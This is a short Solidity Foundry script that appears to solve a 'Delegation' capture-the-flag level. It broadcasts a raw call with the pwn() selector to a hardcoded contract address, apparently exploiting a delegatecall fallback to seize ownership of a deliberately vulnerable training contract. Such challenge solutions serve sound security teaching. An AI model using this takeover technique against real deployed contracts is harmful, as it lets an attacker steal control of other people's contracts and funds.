// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Delegate.sol";

contract DelegateScript is Script {
    Delegation delegationInstance = Delegation(0x09f664D9ac7d7d834a93c2F8FC3F38FA21FBFf04); 

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
    }
}
